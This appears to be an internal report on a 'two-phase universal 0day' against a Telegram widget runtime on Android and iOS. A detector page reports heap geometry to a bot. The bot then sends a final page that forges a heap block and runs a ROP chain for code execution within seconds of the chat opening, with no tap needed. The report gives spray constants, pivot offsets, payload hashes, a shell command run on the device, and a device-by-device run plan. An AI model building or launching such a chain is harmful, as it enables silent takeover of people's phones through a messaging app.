# Two-phase universal 0day — detector, host mapping, pre-calibrated final (2026-11-08)

Host-only. No device, bot or network action by this worker. The orchestrator
runs the live sequence (Sony first, then Pixel, then Samsung on Tuesday; the
17e and 6s are the iOS track).

Goal: **one open → 2–3 s → code execution**, with one report format and one
host mapping across Android and iOS. Phase 1 measures/echoes the device
geometry and reports it; the host maps it and immediately sends Phase 2, which
is pre-calibrated and runs the endgame inline (~0.5–1.5 s). The fastest path is
the direct final; the detector is the universality/fallback layer.

Artifacts: `lab/two_phase_20261108/` (generator, detector, final, fallback,
server, mocks, host matrix). Facts:
`notes/LEMMALOG_FACTS_two_phase_20261108.txt`. Baseline:
`notes/universal_parallel_20261108.md`, `notes/pixel72801_route2_crash_20261108.md`,
`notes/widget_answer_channel_20261108.md`.

> **Number and hash warning.** This document was written across several
> revisions and mixes the P2/ungated pair (9,176 B, 1,489/3,988 zlib9) with the
> P3/gated pair (9,185 B, 1,641/4,068 zlib9). Read the package name in each
> table. Every `bf31f2f6…`, `3,680`, `3,937` or `41f9e6…` value is
> pre-redaction. Current pins are in `docs/PAYLOAD_HASHES.json`; current
> iOS 27 values are 3,658 / `8b6706e5…` for the proven page and 3,915-3,917
> for the gated twins. The device-proven iOS 27 page is 8,647 B; the gated
> twin is 9,139 B and host-only.

---

## 0. Verdict (short)

1. **Android route2: the detector and the final are the same page shape by
   construction.** They share the byte-identical stage-A text and the same
   total raw page length (**9,176 B**); only stage C differs (packed report vs
   endgame + marker). Host experiment (`m_shape_dummy.html`): a same-length
   dummy stage C forges exactly like the real endgame, so the detector's
   measured geometry is the final's geometry class. (An earlier "content
   sensitivity" reading was a marker bug — the detector reported its anchor
   scan, not its forge — plus an extra mock `<script>`; both are fixed.)
   **iOS 27 is different by design:** the detector is a non-forging handshake
   and the final is the self-sweeping 8,647-B `ss8_final`; they are not
   page-equal (§9.2).
2. **Detector**: one widget, safe probe + 2-attempt H sweep; the P3 detector is
   **1,641 zlib9**, sha256 `ba063822…`; the report is **31 packed bytes =
   "P3"+62 hex = 64 chars** (v3: platform/chain + geometry + padM/N/SZ/UB +
   `t_rep`), exactly the 64-byte request-`data` limit. The Android detector
   forges (safe teardown on Android); the iOS 27 detector is a **non-forging
   safe handshake** (a forge would abort the app at teardown); the iOS 15
   detector is the device-proven marker probe with a P3 relay. All send the
   report with `TelegramWidget.request` and survive a miss (`NOCORR`/safe).
3. **Host** (`bot_two_phase.py`): parses the report, ACKs `K`, and immediately
   `sendWidget`s the final to the same chat (**height 50**, same open). Hit →
   `final_inline.html`; miss → `final_fallback.html` (the device-proven
   probe + 8-chunk answer chain). Optional `devices.json` per-uid override
   (`prefer: final|fallback`). `--self-test` and `--simulate` PASS offline.
4. **Final**: the P3/gated page is 9,185 B with the endgame inline (**4,068
   zlib9**, sha256 `f8bba658…`, 28 B under the 4,096 server limit). The P2
   page in `bot/` is 9,176 B / 3,988. The endgame runs after stage A and marks
   `HF … T1=<ms>`. The in-widget 2-attempt re-arm is the stale-geometry
   fallback; a miss is a marker (`HF ERR NOV`), never a crash from our own
   record.
5. **Host validation green**: detector HIT ATT=0 3/3, forced-miss twin HIT
   ATT=1 3/3, all-miss twin MISS 3/3, final on the device endgame `ABLEN …
   HF ERR NOANCHOR` 3/3 (safe host-only stop), final with the host endgame
   `ABLEN … HF HF OK` 3/3; page-length equality asserted; server self-test and
   simulate PASS.
6. **Multi-platform extension (2026-11-08)**: the report is **v3** (`P3`+62
   hex, 31 bytes, 64 chars) with `platform`/`chain`/`safe`/`padM`; the unified
   `platforms.json` maps Android route2, **iOS 15 hole-reuse** and **iOS 27
   parser**. iOS 27 (17e) is device-proven by message 5725: the canonical final
   is **`ss8_final.html`, 8,647 raw / 3,680 zlib9, sha `bf31f2f6…`** (the
   3,680/`bf31…` pair is pre-redaction; current is 3,658 / `8b6706e5…`), not
   the older 6,295-B univA twin. The 17e detector is a **safe, non-forging
   handshake** (1,581 / 804, sha `609b7180…`); the 6s detector is the
   device-proven probe with a marker relay. §9–§14 give the corrected
   payloads, matrix, timing, device plan and failure modes.
7. **Timeline**: the **direct one-message final is the hot path** (inline ROP,
   no answer fetch) ≈ **0.8–2.5 s**; the two-phase detector + final ≈
   **1.1–3.3 s** (host parse+map+dry send p50 0.047 ms; delivery is the
   dominant segment). The 2–3 s target is met on a known 17e chat by sending
   the canonical final directly; the detector is for an unknown platform/chat
   or a stale `last_m`. If the final misses (safe `HIT=-1`), the host re-sends
   the final after the 3 s cooldown; reliability is not traded for speed.
8. **JS-visible fingerprint is thin and stated honestly**: screen,
   devicePixelRatio, locale, timezone, API profile. Model, Android version,
   RAM, widget heap limit and QuickJS build are **not exposed** (UA is the
   constant `Mozilla/5.0 TelegramWidget/1.0`), so the report is a geometry
   report, not a device-identification report. `chat_data`/`public_data` are
   materialised at boot (not placement-free) and are not used as a payload
   channel.

---

## 1. Phase 1 — detector payload

> **Historical v1 (Android).** This section describes the original 21-byte
> `P1` report and the P2/ungated 9,176 B page. The current package uses the
> 31-byte `P3` report (64 chars, §9.7) and the gated 9,185 B page. Current
> pins: P3 detector 1,641 zlib9 / `ba063822…`; P3 final 4,068 / `f8bba658…`.
> The 1,489 / `35f8698e…` pair below is the P2 page in `bot/`. The iOS 27
> detector is the safe handshake of §9.2.

`lab/two_phase_20261108/detector.html` (P2/ungated example)

| field | value |
|---|---|
| raw / zlib9 | **9,176 B / 1,489 B** (limit 32,768 / 4,096) |
| sha256 | `35f8698ead92bd2ed27f7539fcb06196450fb959d2a912f596d8da872d3890f1` |
| stage A | the parallel `w_v0` logic: GC prime, class-512 string spray (NP=2600/NQ=2600), class-512 victim (9 floats), tagged-int record, 2 attempts (2600/2600 then 4000/2600) with a GC re-arm |
| stage C | compact report + pad to exactly the final's stage-C length (7,642 B) |
| mode | none needed; the page is the detector by content |

### 1.1 Report protocol v2 (widget -> bot, request `data`, 1-64 B)

`"P2"` + 46 lowercase hex chars = **23 packed bytes = 48 chars** (limit 64),
big-endian. One schema for Android and both iOS chains; the per-platform
meaning of the geometry fields is in the table.

| # | bytes | field | Android route2 | iOS 15 hole-reuse | iOS 27 parser |
|---|---:|---|---|---|---|
| 0 | 1 | ver | 2 | 2 | 2 |
| 1 | 1 | platform | 1 | 2 | 3 |
| 2 | 1 | chain | 1 route2 | 3 holes | 4 parser |
| 3 | 1 | hit | 1 = `ABLEN` forge | 1 = `LEN=327744` | 1 = `ABLEN` forge |
| 4 | 1 | att | hit attempt (255 none) | 0 (relay) | 0 (single) |
| 5-6 | 2 | sel | victim index (599) | probe H (400/200/500/64) | victim index (599) |
| 7-8 | 2 | n | anchor offset in `V[0,4096)` | `HIT` index | `vk` |
| 9-10 | 2 | hd | u16 block header at `n-8` | `VK` | 0 |
| 11 | 1 | cb | class byte at `n-6` | `PH` | `PH` |
| 12 | 1 | dpr | devicePixelRatio x10 | same | same |
| 13-14 | 2 | sw | screen width | same | same |
| 15-16 | 2 | sh | screen height | same | same |
| 17-18 | 2 | lang | language first two chars | same | same |
| 19 | 1 | tz | offset/15 + 128 | same | same |
| 20 | 1 | profile | `TelegramWidget.profile` | same | same |
| 21-22 | 2 | el | elapsed ms (clamp) | 0 | 0 |

Examples: Android `P2020101000257ffff0000000a000000003f3f7c010023`;
iOS 27 `P20203040100025702560000040a000000003f3f80010000`;
iOS 15 relayed `P202020301000190022102562400000000003f3f80010000`.

Android derives the hit from `mark` (not the anchor scan) and the attempt from
`mark`; the anchor scan is best-effort. iOS 27 derives hit/sel/vk/ph from
`globalThis.N1MARK`. iOS 15 has no in-page request in the proven probe: the
orchestrator reads its `#v` marker and `relay_ios15.py` packs it into the same
P2 hex (`--manual-report`).

The detector marker (bubble/logcat): `DET HIT|MISS ATT=<m> T0=<ms> R=<report>`
(Android) / `DET HIT SEL=<i> VK=<vk> PH=<ph> R=<report>` (iOS 27) /
`RESULT ATTR ... HIT=... LEN=327744 ...` (iOS 15 probe).

---

## 2. Host — mapping and send

`lab/two_phase_20261108/bot_two_phase.py` (subclass of the proven
`oob/bot_server.py`; one `getUpdates` consumer per token):

```
widget_query data = "P2"+46hex
  -> parse_report() + platforms.json       (23 bytes, ver 2)
  -> devices.json[uid].prefer  (optional operator prior: force final|fallback)
  -> default: mode = hit ? final : fallback
  -> ACK answerWidgetQuery(widget_query_id, data="K")      (15 s window)
  -> sendWidget(chat_id, height=50, allow_queries, background_query,
                html = final_inline.html | final_fallback.html)
widget_query data = "E<i>"  ->  answerWidgetQuery(widget_query_id, data=chunk[i])
```

* **Latency instrumentation**: the log records the query receive timestamp,
  the ACK round trip, and the `sendWidget` round trip (`RT`, measured
  100–170 ms on the answer channel); the device-side `T0_final − T0_detector`
  (same device clock) is the true host+delivery gap.
* **Cooldown**: 3 s between second messages per server process (a re-opened
  detector does not spam the chat).
* **Mapping is a decision, not a per-device binary**: the payloads are the same
  bytes everywhere; the report chooses fast path vs fallback. The final replays
  the detector's attempt sequence (the hit is heap-history dependent), so no
  H substitution is done.
* Offline: `--self-test` (pack/unpack, negatives, length ≤64) **PASS**;
  `--simulate` (hit → final, miss → fallback, then `E0`) **PASS**.

---

## 3. Phase 2 — final payloads

> **Android route2 only.** The iOS 27 canonical final is the 8,647-B
> `ss8_final.html` (sha `bf31f2f6…`) and the iOS 15 attribute final is 6,801 B;
> see §9.1/§9.5. The 9,176-B page below is not sent to iOS.

### 3.1 `final_inline.html` (detector hit)

| field | value |
|---|---|
| raw / zlib9 | **9,176 B / 3,988 B** |
| sha256 | `7aae63e7aed883646e4b41e5acb8b3f46da08a36e1c02c7f32bbfaec98077b33` (release CMD) |
| stage A | byte-identical to the detector's |
| stage C | the dynamic ELF/GNU-hash endgame (`oob/endgame_72801.js`, 7,469 B) + marker with `T1` |
| marker | `S1 ABLEN[599]=327744 ATT=<m> VLEN=327744 T0=<ms> | HF <OK|ERR …> T1=<ms>` |
| package | release CMD `id>/data/data/org.telegram.messenger/files/n1`; `--pkg beta` builds `…messenger.beta/files/n1` |

The endgame is inline, so there is **no request/pacing** in the fast path: after
the stage-A forge the endgame runs immediately (~0.2–0.5 s device estimate;
41–59 ms on the host including process start).

### 3.2 `final_fallback.html` (detector miss, or operator override)

The device-proven out-of-band widget `oob/s2oob_device_72801.html`
(**2,151 raw / 1,024 zlib9**, sha256 `245f4dc4…`): the probe's stage A +
the 8 × 1,000-B answer-chain driver. The same server answers `E<i>`. Background
pacing is 5 s/chunk (~37 s); the answer-channel note's tap/re-show paths can
compress that to ~5–7 s if the user taps. This path is chosen when the detector
cannot certify the inline page on the device.

---

## 4. Host validation (`lab/two_phase_20261108/run_host.sh`)

> **Historical Android matrix.** The current multiplatform matrix (P3, iOS 27
> safe detector, iOS 15 relay, host chain timing) is §10 and
> `logs/host_matrix.txt`. The table below is the original Android v1 run.

`run_sib_plain` (shipped sibling-script model, 8 MiB):

| test | runs | result |
|---|---:|---|
| `m_det` (mock request captures the report) | 3 | `DET HIT ATT=0 … R=P10101000257…` 3/3 |
| `m_det_ra` (attempt 0 forced to a safe miss) | 3 | `DET HIT ATT=1 …` 3/3 (re-arm works) |
| `m_det_miss` (no trigger) | 3 | `DET MISS ATT=255 …` 3/3 |
| `m_fin_dev` (device endgame on the host) | 3 | `ABLEN[599]=327744 ATT=0 … HF ERR NOANCHOR … T1=…` 3/3 (safe host-only stop) |
| `m_fin_host` (host endgame) | 3 | `ABLEN[599]=327744 ATT=0 … HF HF OK T1=…` 3/3 |
| page equality | — | detector/final raw both 9,176 B (asserted in the generator) |
| `bot_two_phase.py --self-test` | — | PASS (44-B report ≤64, negatives rejected) |
| `bot_two_phase.py --simulate` | — | PASS (hit → final, miss → fallback, `E0` answered) |

The same-length dummy experiment (`m_shape_dummy.html`, earlier in the lab):
`ABLEN[599]=327744 ATT=0` — content of stage C does not change the stage-A
geometry, only its length does.

---

## 5. Expected end-to-end timeline (device)

| # | segment | estimate | how it is measured |
|---|---|---:|---|
| 1 | user opens the chat; detector binds and runs stage A + report request | 0.2–0.5 s | detector marker `T0` + report `el` |
| 2 | request update → bot (long-poll) + host parse + ACK | 0.1–0.5 s | server `lat_recv` / ACK `RT` |
| 3 | `sendWidget` API + Telegram delivery + final bind | 0.5–1.5 s | `T0_final − T0_detector` (device clock) |
| 4 | final stage A + inline endgame | 0.3–0.8 s | final `T1 − T0` (device clock) |
| | **total** | **1.1–3.3 s** | `T1_final − T0_detector` |

The fast path is tap-free (the user only keeps the chat open at the bottom;
the final arrives as a new message). A tap on the detector is not needed; the
first background request is allowed on appearance.

---

## 6. Device sequence

### 6.1 Preconditions

* `bot_two_phase.py` running with the token (one `getUpdates` consumer; stop
  `bot.py`/other pollers first), `--uid` of the phone account,
  `--chunks chunks` (release) or `chunks_beta` (Sony beta).
* Detector sent as a normal widget message (`height 50`, `allow_queries: true`,
  `background_query: true`, private chat <CHAT_ID>). The final is sent by the
  server, not by hand.

### 6.2 Sony XQ-BT52 (beta 13.2.2 / 72929, MTE off, 6 MiB) — first, faster testbed

1. Send `detector.html` (beta build: `gen_two_phase.py --pkg beta` first).
2. Open the chat once; keep it visible. Expect `DET HIT|MISS … R=P1…` within
   ~0.5 s.
3. On HIT the server sends the final immediately; the bubble appears below and
   binds without a search. Expect `S1 ABLEN… | HF OK T1=…` within ~1 s of the
   final's `T0`. On MISS the server sends the fallback; expect the `G1/8 …
   HF HF OK` chain.
4. Record `T0` (detector), `T0`/`T1` (final) and the server log. This run is
   also the first **route2-on-Sony** datum; the Sony's c2560s chain (device
   5/5) remains the cross-tag fallback if route2 misses there.

### 6.3 Pixel 9 (release 72801) — second

Same detector/final (release CMD, `chunks/`). One open; the same markers. This
is the device where route2 is already proven (`16807/16808`), so the two-phase
run should hit the fast path; if not, the fallback chain is the proven one.

### 6.4 Samsung (arriving Tuesday) — first-open universal test

Same payloads and server; only the proof path may differ
(`/data/data/<pkg>/files/n1`, regenerate with `--pkg` if needed). The detector
report is the device datum (DPI/screen/anchor + hit/attempt) for the
per-device table; no new payload is built from it.

### 6.5 iPhone 17e / 6s — iOS track (now part of the package)

The iOS 27 (17e) canonical final is the device-proven `ss8_final.html`
(8,647 / 3,680, sha `bf31f2f6…`), not the Android 9,176-B page. The 17e
detector is a safe handshake (no forge); the 6s uses the device-proven
attribute probe + P3 relay. See §9–§14 for the corrected payloads, the host
mapping and the device plan; live runs stay with the orchestrator.

### 6.6 Failure table

| marker / log | meaning | action |
|---|---|---|
| `DET HIT` + final `HF OK` | fast path | pull the proof; record T0/T1 |
| `DET HIT` + final `HF ERR <token>` | final ran, endgame failed (stale anchor/ELF) | report the token; the stage A is proven |
| `DET HIT` + final `HF ERR NOV` | final missed (stale geometry) | the in-widget re-arm was exhausted; re-open once (new heap), else fallback |
| `DET MISS` + fallback chain | fast path not certified | let the chain run (`G1/8…`), or tap to compress it |
| `DET MISS` + fallback `NOV` | the probe itself missed | re-open; report the report hex (screen/anchor) |
| no detector marker | widget stopped (CPU/memory) | check `stopped (N)` in logcat; the detector is the same page as the final — do not resend the final |
| crash at `0x174986c`/`0x17498ec` | the 9.2-KB page's placement failed destructively | tombstone; the detector should not have been sent if this class is unsafe on that device — this is the one risk the detector cannot remove |

Logcat greps: `widget`, `twidget`, `widget_query`, `DET `, `ABLEN`, `HF `,
`no can_query`, `no background_query`, `once per 5 s`, `already in flight`,
`Memory limit`, `CPU limit`.

---

## 7. Limits (honest)

* **Fingerprint**: model/Android/RAM/heap/QuickJS are not JS-visible; the
  report is geometry + screen/DPR/locale. The host cannot key a per-model table
  from the report; `devices.json` is an operator prior.
* **Geometry transfer**: the detector and final are the same page bytes and
  replay the same attempt sequence, but they run in **different runtimes**
  (different engine baselines). A stale baseline can miss; the final's 2-attempt
  re-arm is the in-widget fallback, and the host can switch to the answer chain.
* **Fast-path gate**: the 9.2-KB inline page has two device `NOCORR` data
  points on the Pixel (`s2s9`/`s2s10`, both with the older stage A); the new
  stage A adds the string priming and a 2-attempt sweep. Whether the 9.2-KB
  shape hits on the Pixel/Sony is the device test's first question.
* **Size margin**: the final is 3,988 zlib9, 108 B below the 4,096 limit; any
  edit must re-run `gen_two_phase.py` and check the zlib9.
* **Crash risk**: a foreign/unmapped `+20` slab is still fatal (device 16723);
  the detector cannot rule it out without an arbitrary read. This is the
  residual risk shared with the parallel package.
* The timeline estimates are host-measured/inferred; only the device `T0/T1`
  deltas decide the 2–3 s claim.
* No device, bot or network action was taken by this worker.

---

## 8. Files

> **Current canonical file list: §14.** The list below is the original Android
> package; the iOS 27/iOS 15 files are in §9 and §14.

```
lab/two_phase_20261108/
  gen_two_phase.py            Android generator (detector, final, fallback, mocks, chunks)
  detector.html               9,176 raw / 1,489 zlib9 / sha 35f8698e… (report v2)
  final_inline.html           9,176 raw / 3,988 zlib9 / sha 7aae63e7…
  final_fallback.html         2,151 raw / 1,024 zlib9 / sha 245f4dc4…
  gen_ios27_univA.py          OLD univA twin generator (superseded; see §14)
  ios27/old/detector_ios27_univA.html  6,295 raw / 1,601 zlib9 (host-only twin)
  ios27/old/final_ios27_univA.html     6,295 raw / 2,481 zlib9 (NOT the 5725 payload)
  ios27/probe_fallback.html   the old univA probe (diagnostic only)
  ios15/at_probe_h*.html      the 6s probe set (H400 device-proven; 6,801 B)
  ios15/at_final_h*.html      the 6s attribute finals (6,801 B, device-pending)
  relay_ios15.py              6s marker -> P3 hex
  platforms.json              unified platform/chain table (1/2/3)
  bot_two_phase.py            v3/P3 report parser + mapping + sendWidget + chunks
  m_det.html, m_det_ra.html, m_det_miss.html, m_fin_dev.html, m_fin_host.html
  m_shape_dummy.html          same-length dummy stage-C experiment
  chunks/  chunks_beta/       fallback endgame 8 x 1,000 B + manifest
  run_host.sh, logs/host_matrix.txt
notes/LEMMALOG_FACTS_two_phase_20261108.txt
tg-rce/README.md, tg-rce/docs/PLAN_two_phase_20261108.md   (repo plan)
```

---

## 9. Multi-platform extension — corrected iOS 27 payload (2026-11-08 17:xx)

> **Correction.** The 17e proof payload (message 5725) is
> `ios17e/v2/ss8_final.html`: **8,647 raw / 3,680 zlib9**,
> sha256 `bf31f2f66485174d086d520cbbf8f0434eed674c7282c0a87d731d46015248f8`.
> The earlier 6,295-B `n1_ios_univA_final` twin is **not** the 5725 payload and
> is not a geometry twin of it. It is kept as
> `ios27/old/final_ios27_univA.html` (6,295 / 2,481, sha `c2d48205…`) and
> must not be sent as the 17e final. The 5725 proof wrote the 7-byte
> `RCE_OK\n` (sha256 `704984d9…`) into
> `AppGroup/00000000-0000-0000-0000-000000000000/rce.txt`; the app stayed alive
> because the ROP ends in `pthread_exit`.

Platform/chain ids in the unified report:
**1 = Android route2**, **2 = iOS 15 hole-reuse**, **3 = iOS 27 parser**.

| platform | chain | detector | final | detector mode |
|---|---|---|---|---|
| Android route2 | `ARG_SCOPE_END` route2 | `detector.html` | `final_inline.html` | self-report (forges; teardown is safe on Android) |
| iOS 15 (6s) | hole-reuse, Apple tiny class-976 | `ios15/at_probe_h400.html` | `ios15/at_final_h400.html` | marker relay -> P3 |
| iOS 27 (17e) | compile-first, self-sweep | `ios27/detector_ios27.html` | `ios27/final_ios27.html` (= ss8) | **safe handshake, no forge** |

### 9.1 iOS 27 final (canonical, device-proven)

| field | value |
|---|---|
| file | `lab/two_phase_20261108/ios27/final_ios27.html` |
| raw / zlib9 | **8,647 / 3,680** (4,096 limit; 416 B margin) |
| sha256 | `bf31f2f66485174d086d520cbbf8f0434eed674c7282c0a87d731d46015248f8` |
| stage A | compile-first: `MS=[512,640,768,896,1024,256,384,128,0,1536,2048,2560,1280,1792,3072]`, `N=2600`, `SZ=957`, `C=34`, `PH={4,12,20,28,36}`, `VKS={598,588,578,568,558}`, 40-byte PAT |
| S2 | inline minified srop, **6,099 chars** (`srop_v5_min.js`); no answer fetch |
| 5725 marker | `HIT=545 LEN=327744 PH=12 VK=598 NT=106` (`RESULT SS2 C=34 SZ=957 N=2600 …`) |
| stage B | UB scratch 24 x `Uint8Array(576)` with magics at +0x200/+0x210; value/struct scan + JS-arena walk; `TRIG=null` -> `js_free_rt` -> `libcFree+0xB6583074` pivot -> `open/write/pthread_exit` |
| proof | `<AppGroup>/rce.txt`, 7 bytes `RCE_OK\n`, sha256 `704984d94917e9108dd47ee93714cad1b150078dfd36e828182fe0d82eed07d4` |

The `R=4 M=768` pair in the screenshot bursts comes from an earlier message
(the shipped `ss8` order maps `R=4` to 1024; the proven constants are
`HIT=545 LEN=327744 PH=12 VK=598 NT=106`). The marker is read as
`R<ri> M=<M> h=545` on a hit (the ROP `pthread_exit`s before the final
`RESULT` line), and as `RESULT … HIT=-1 …` on a safe miss.

### 9.2 iOS 27 detector — safe handshake (why it does not forge)

A stage-A forge corrupts the class-64 block header; when the widget context is
torn down without the ROP’s `pthread_exit`, `js_free_rt` aborts the app
(`notes/ios17e_instrument_20261108.md` 9.11). A detector that forges therefore
cannot pass a live app to phase 2. The iOS 27 detector is deliberately
**non-destructive**:

1. build the P3 report from the calibrated 5725 geometry and the device facts;
2. allocate `256 x Uint8Array(957)` and compile `f` (the `eval("(")` default is
   not evaluated; **no `f()` call**), measure `el`;
3. send the report with `TelegramWidget.request` and write the same report to
   `#v` (`DET SAFE P3…`); the app stays alive;
4. the host sends the proven final; the final’s own pad self-sweep is the
   reliability mechanism.

The report is therefore a **handshake + calibrated-parameter echo**, not a
certificate that the final will hit. The final marker is the measurement.
The old `ios27/probe_fallback.html` (2,641 / 1,015) is the univA probe and is a
**diagnostic only**, not the iOS 27 fallback; the fallback is a re-send of the
final after the 3 s cooldown.

| field | value |
|---|---|
| file | `ios27/detector_ios27.html` |
| raw / zlib9 | **1,581 / 804** |
| sha256 | `609b7180d52ee6c654f08b9931ccb487f5b95e2db29fb19ffa2411a2582d4632` |
| mock | `ios27/m_det.html` 1,721 / 870 / `9c0fd8e0…`; captures `REP` |
| marker | `DET SAFE P3…` (64 chars, greppable) |
| host mock result | `DET SAFE P303030406ff0000022102560c0a000000003f3f7c000103001aef…` |

### 9.3 Pad-first final variants (pre-calibration)

All 15 permutations keep the **same 8,647 raw length** (the `MS` set is a
permutation; the script text length is invariant). zlib9 is 3,680–3,684.

| file | first M | raw | zlib9 | sha256 |
|---|---:|---:|---:|---|
| `final_ios27.html` | 512 | 8,647 | 3,680 | `bf31f2f6…` |
| `final_ios27_m768.html` | 768 | 8,647 | 3,682 | `a0b17e90940c26895c506b668a2b9a2afd6e8a7938bb36abf1bfbeab711cd8a8` |
| `final_ios27_m640.html` | 640 | 8,647 | 3,681 | `630bc01af8cd10b91ca711c2031b8b5599a0f60ce6e8660cea988fae625ed7f8` |
| `final_ios27_m1024.html` | 1024 | 8,647 | 3,681 | `b7fac23aaac9d8b956efa9c052ec7a68e8ae3415171772270e3a6e769d47c147` |

The host uses `padM` from the report, or `devices.json[uid].last_m` (the last
hit M read from the final marker), to pick a variant; if no M is known, it
sends the proven `final_ios27.html`. The variant still tries all 15 pads; the
order only moves the likely hit earlier.

### 9.4 Timed final (lab instrument, not the mission)

`ios27/final_ios27_timed.html` adds `T0=Date.now()` and `T1` to the hit
marker and the final `RESULT`: 8,807 raw / 3,716 zlib9 / `39b567ea…`.
`ios27/final_ios27_timed_miss.html` (8,803 / 3,714 / `cadfa07c…`) removes the
`f()` call so the host can read the `RESULT … T0/T1` miss path. Host run:
`RESULT SS2 … R=14 M=3072 HIT=-1 LEN=0 PH=-1 VK=-1 NT=375 T0=… T1=…` with
`T1-T0 = 517 ms` for 375 attempts (host lower bound). Use the timed final for
**one timing run**; the operational proof uses the canonical `final_ios27.html`.

### 9.5 iOS 15 (6s) — probe is device-proven, attribute final is pending

The `at_probe_h400.html` / `at_final_h400.html` pair is the same-size
attribute pair (6,801 B; probe 1,050 zlib9, final 2,528 zlib9). The **probe**
is device-proven on the 6s:

```
RESULT ATTR C=34 SZ=957 N=3000 H=400 HN=64 HIT=545 LEN=327744 PH=36 VK=598 NT=21 S2LEN=-1
```

The **attribute final** is host-validated (same stage A on the host; the
actual iOS final stops at the host Mach-O base guard `NO_BASE`, expected; the
host twin reaches `IOS_N1_OK` 3/3 in
`lab/ios_way/evidence/host_attr_matrix.log`) but has **not** been run on the
6s. The 6s RCE proof is the older `srop.js` path:
`srop.js` 6,011 / 2,596 / `ae436e3f…`, `ls_seed_srop.html` 6,400 / 2,770 /
`a03985e7…`, `ls_final_h200_2036.html` 2,036 / 939 / `541854df…`, proof
`/private/var/mobile/Containers/Data/Application/00000000-0000-0000-0000-000000000000/Documents/rce.txt`.
The attribute pair is the primary candidate; the `srop.js` DB-rewrite path is
the proven fallback.

Probe/final hashes: H400 `4cf7efc4…` / `9085b588…`; H200 `92990da7…` /
`f810c05c…`; H64 `d2a5ea73…` / `4d72cfb9…`; H500 `1c3da6df…` / `4f36e9be…`
(full values in `ios15/PAYLOADS.json`). H order:
**400 -> 200 -> 64 -> 500** (the device order in `notes/ios_way_20261108.md`
3.6.3); the final is sent at the same H as the hit.

### 9.6 Android

The Android detector is upgraded to P3 and rebuilt at the same page length:

| file | raw | zlib9 | sha256 |
|---|---:|---:|---|
| `detector.html` (P3) | 9,176 | 1,546 | `1852d1ad78f68b76e1e763b1a4e144968b32c262b6c7cf0e417fc368a2180389` |
| `final_inline.html` | 9,176 | 3,988 | `7aae63e7aed883646e4b41e5acb8b3f46da08a36e1c02c7f32bbfaec98077b33` |
| `final_fallback.html` | 2,151 | 1,024 | `245f4dc4a2773fedc10647e35b3e95d65409aafb21d7d6f1925ef9aa6a225e1d` |

The detector and final remain page-equal (9,176 B). The report has the same
P3 layout; `padM/N` are 0/2600, `SZ/UBn/UBsz` are 0. The final/answer-chain
behavior is unchanged.

### 9.7 Unified report v3 (P3) — 31 bytes = 64 chars

`"P3" + 62 lowercase hex`. This is the maximum for the shared request-data
limit (1–64 UTF-8 bytes; the answer is up to 1,024 B and the 15 s window is
unchanged).

| # | bytes | field |
|---|---:|---|
| 0 | 1 | ver = 3 |
| 1 | 1 | platform 1/2/3 |
| 2 | 1 | chain 1/3/4 |
| 3 | 1 | flags: bit0 hit, bit1 safe, bit2 answer, bit3 timed |
| 4 | 1 | att (255 = unknown) |
| 5–6 | 2 | sel (H for iOS 15, victim index for Android/iOS 27) |
| 7–8 | 2 | n (anchor offset / HIT index) |
| 9–10 | 2 | hd (block header / VK) |
| 11 | 1 | cb (class byte / PH) |
| 12 | 1 | dpr x10 |
| 13–14 | 2 | screen width |
| 15–16 | 2 | screen height |
| 17–18 | 2 | language |
| 19 | 1 | tz/15 + 128 |
| 20–21 | 2 | elapsed ms |
| 22–23 | 2 | padM (iOS 27 calibrated first pad; 0 = none) |
| 24 | 1 | N/100 (26 = 2600) |
| 25 | 1 | SZ/4 (239 = 956/957) |
| 26 | 1 | UBn (24) |
| 27 | 1 | UBsz/8 (72 = 576) |
| 28–30 | 3 | t_rep low 24 bits (device ms) |

The host still parses legacy **P2** (23 bytes / 48 chars) from older Android
detectors and old relay output. `t_rep` is the device clock at the report; the
final's `T0` is the same clock, so `T0_final - t_rep` (mod 2^24) is the true
delivery gap for the timed run.

### 9.8 Host mapping (`bot_two_phase.py` v3)

```text
widget_query data = P3…
  -> parse_report()                       (P3 or legacy P2)
  -> devices.json[uid] platform override (authoritative; UA is constant)
  -> target_for():
       platform 1: hit -> final_inline.html; miss -> final_fallback.html
       platform 2: hit -> ios15/at_final_h<sel>.html; miss -> next H probe
       platform 3: safe/hit/miss -> final_ios27[_m<last_m|padM>].html
  -> ACK answerWidgetQuery(data="K")      (15 s window)
  -> sendWidget(chat, height=50, allow_queries, background_query)
  -> 3 s per-chat cooldown
```

`devices.json` (copy `devices.example.json`) is the per-uid prior:
`platform` (1/2/3), `last_m` (iOS 27 hit pad), `prefer` (Android `final|fallback`). The report’s platform/chain are hints; the uid table is
authoritative because `navigator.userAgent`/`platform` are constant
(`Mozilla/5.0 TelegramWidget/1.0`, `TelegramWidget`), and the iOS/Android
sandbox bundles expose the same `TelegramWidget` surface.

## 10. Host validation (actual runs, 2026-11-08 17:1x)

All host-only; `run_host.sh` with `run_sib_plain -l 8` (8 MiB model), no
device/bot/network.

| test | runs | result |
|---|---:|---|
| Android `m_det` P3 (JS -> Python) | 3 | `DET HIT ATT=0 …`, parse PASS 3/3 |
| Android `m_det_ra` forced miss | 3 | `DET HIT ATT=1 …`, parse PASS 3/3 |
| Android `m_det_miss` | 3 | `DET MISS ATT=255 …`, parse PASS 3/3 |
| Android `m_fin_dev` | 3 | `ABLEN … HF ERR NOANCHOR … T1` 3/3 (safe) |
| Android `m_fin_host` | 3 | `ABLEN … HF HF OK T1` 3/3 |
| iOS 27 `detector_ios27` | 2 | `DET SAFE P3…` 2/2 |
| iOS 27 `m_det` + JS->Python parse/map | 2 | `P3` 64 chars; platform 3, safe 1, padM 768 -> `ios27/final_ios27_m768.html` |
| iOS 27 `final_ios27` / `m768` / `timed` | 2 each | `LEN_72` (host stage-B stop) 6/6 |
| iOS 27 `timed_miss` (host) | 1 | `RESULT SS2 … HIT=-1 … T0=… T1=…`, `T1-T0 = 517 ms / 375 attempts` |
| iOS 15 `at_probe_h400` / `at_final_h400` | 1 each | `HIT=545 LEN=327744 PH=36 VK=598 NT=21` 2/2 |
| iOS 15 relay -> P3 -> map | 1 | `P3…` 64 chars -> `ios15/at_final_h400.html` |
| `--self-test` | — | PASS (P3 64 chars, P2 legacy, all rows) |
| `--simulate` | — | PASS (Android hit/miss, iOS 15 hit/next-H, iOS 27 M=768/default) |
| host chain, 300 reports | — | p50 **0.047 ms**, p95 **0.060 ms** (parse+map+dry cached send) |
| host script execution | 5 each | safe detector **1.6 ms**; final **19.1 ms** (host lower bound) |
| zlib9 budget | — | iOS 27 max **3,716** (timed); Android final 3,988; all <=4,096 |

